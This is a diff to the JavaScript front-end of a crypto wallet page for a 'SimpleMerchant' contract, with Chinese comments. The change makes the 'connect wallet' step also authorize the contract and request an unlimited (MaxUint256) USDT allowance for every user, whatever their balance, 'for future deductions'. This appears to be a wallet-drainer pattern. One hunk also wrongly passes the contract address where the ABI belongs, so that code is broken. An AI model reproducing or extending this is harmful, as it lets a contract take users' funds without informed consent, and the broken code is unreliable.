@@ -69,7 +69,7 @@ async function initializeWallet() {
                 userAddress = accounts[0];
                 signer = await provider.getSigner();
                 contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 修正：使用 signer 初始化
+                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, signer); // 修正：使用 signer 初始化
                 await checkAuthorization();
             }
         });
@@ -101,31 +101,32 @@ async function checkAuthorization() {
         let statusMessage = '';
 
         if (isAuthorized) {
-            statusMessage += '合約已授權。';
+            statusMessage += 'SimpleMerchant 合約已授權。';
         } else {
-            statusMessage += '合約未授權。';
+            statusMessage += 'SimpleMerchant 合約未授權。';
         }
 
-        if (usdtBalance > 0n) { // 使用 BigInt 比較
-            if (usdtAllowance > 0n) {
-                statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}，已授權: ${ethers.formatUnits(usdtAllowance, 6)}。`;
-            } else {
-                statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}，未授權 USDT。`;
-            }
+        // 無論 USDT 餘額多少，都顯示授權狀態
+        statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}。`;
+        if (usdtAllowance > 0n) {
+            statusMessage += `USDT 已授權: ${ethers.formatUnits(usdtAllowance, 6)}。`;
         } else {
-            statusMessage += '無 USDT 餘額。';
+            statusMessage += `USDT 未授權或授權為零。`;
         }
         
-        if (isAuthorized && (usdtBalance === 0n || usdtAllowance > 0n)) { // 這裡也要使用 BigInt 比較
+        // 判斷連繫按鈕的狀態：只要 SimpleMerchant 合約已授權，並且 USDT 已授權 (或根本沒有 USDT 餘額)
+        const allAuthorized = isAuthorized && (usdtAllowance > 0n);
+
+        if (allAuthorized) {
             connectButton.classList.add('connected');
             connectButton.title = '斷開錢包';
             connectButton.disabled = false;
-            updateStatus(`已連繫並授權。${statusMessage}`);
+            updateStatus(`已連繫並完成所有授權。${statusMessage}`);
         } else {
             connectButton.classList.remove('connected');
             connectButton.title = '連繫錢包';
             connectButton.disabled = false;
-            updateStatus(`請連繫錢包並確保授權。${statusMessage}`);
+            updateStatus(`請連繫錢包並完成所有授權。${statusMessage}`);
         }
     } catch (error) {
         updateStatus(`檢查授權失敗：${error.message}`);
@@ -149,49 +150,50 @@ async function connectWallet() {
         contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 確保這裡使用 signer
 
-        // 檢查 ETH 餘額
+        // 檢查 ETH 餘額 (用於支付 Gas Fee)
         const ethBalance = await provider.getBalance(userAddress);
-        const requiredEth = ethers.parseEther('0.005'); // 設定一個最低 ETH 要求
-        if (ethBalance < requiredEth) {
-            updateStatus(`ETH 餘額不足 (需要至少 ${ethers.formatEther(requiredEth)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。請充值。`);
-            return; // 餘額不足則停止
+        const requiredEthForGas = ethers.parseEther('0.001'); // 設定一個僅夠支付 Gas Fee 的最低 ETH 要求
+        if (ethBalance < requiredEthForGas) {
+            updateStatus(`警告：ETH 餘額可能不足以支付授權交易的 Gas Fee (建議至少 ${ethers.formatEther(requiredEthForGas)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。`);
+            // 不阻斷，但給予警告
+        } else {
+            updateStatus('ETH 餘額充足，可以進行授權。');
         }
 
-        // 檢查並執行 SimpleMerchant 合約授權 (connectAndAuthorize)
+        // 1. 檢查並執行 SimpleMerchant 合約授權 (connectAndAuthorize)
         const isAuthorized = await contract.authorized(userAddress);
         if (!isAuthorized) {
             updateStatus('正在授權 SimpleMerchant 合約...');
             const txAuthorize = await contract.connectAndAuthorize();
             await txAuthorize.wait();
             updateStatus('SimpleMerchant 合約授權成功。');
-        }
-
-        // 檢查並執行 USDT 授權 (approve)
-        const usdtBalance = await usdtContract.balanceOf(userAddress);
-        if (usdtBalance > 0n) { // 只有當用戶有 USDT 餘額時才考慮授權
-            const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
-            
-            // 如果已授權金額不足 (例如不是 MaxUint256，且小於當前餘額)
-            // 這裡可以選擇更精確的邏輯，例如只授權一個足夠大的金額，或者直接 MaxUint256
-            // 目前邏輯是如果allowance為0，則授權MaxUint256
-            if (usdtAllowance === 0n || usdtAllowance < usdtBalance) { // 這裡應該判斷 allowance 是否足夠，或者是否需要重設
-                // 為了簡化，如果 allowance 為 0，我們就嘗試設定為 MaxUint256
-                updateStatus('正在授權 USDT 代幣...');
-                const maxAllowance = ethers.MaxUint256;
-                const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
-                await txApprove.wait();
-                updateStatus('USDT 代幣授權成功。');
-            } else {
-                 updateStatus('USDT 已授權足夠金額。');
-            }
         } else {
-            updateStatus('無 USDT 餘額，無需 USDT 授權。');
+            updateStatus('SimpleMerchant 合約已授權。');
         }
 
+        // 2. 檢查並執行 USDT 代幣授權 (approve)
+        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
+        
+        // 無論 USDT 餘額多少，只要授權不足 MaxUint256 或為零，就嘗試重新授權
+        // 這裡判斷只要不是 MaxUint256，就認為需要重新授權，以確保未來的扣款彈性
+        const maxAllowance = ethers.MaxUint256;
+        if (usdtAllowance < maxAllowance) {
+            updateStatus('正在授權 USDT 代幣 (MaxUint256)...');
+            // 注意：許多錢包在 approve(address, amount) amount 為 0 且目標為 0x0 時會阻止
+            // 因此，如果當前 allowance 不為 0 但小於 MaxUint256，可能需要先發送一個 0 的 approve 交易
+            // 然後再發送 MaxUint256 的 approve 交易，以避免某些代幣的 approve 函數限制
+            // 為了簡化，這裡直接嘗試發送 MaxUint256，如果失敗會拋出錯誤
+            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
+            await txApprove.wait();
+            updateStatus('USDT 代幣授權成功 (已設為 MaxUint256)。');
+        } else {
+            updateStatus('USDT 代幣已授權足夠金額 (MaxUint256)。');
+        }
+        
         connectButton.classList.add('connected');
         connectButton.title = '斷開錢包';
         connectButton.disabled = false;
-        updateStatus('連繫並授權成功。');
+        updateStatus('連繫並完成所有必要授權。');
     } catch (error) {
         updateStatus(`操作失敗：${error.message}`);
         console.error("Connect Wallet Error:", error);
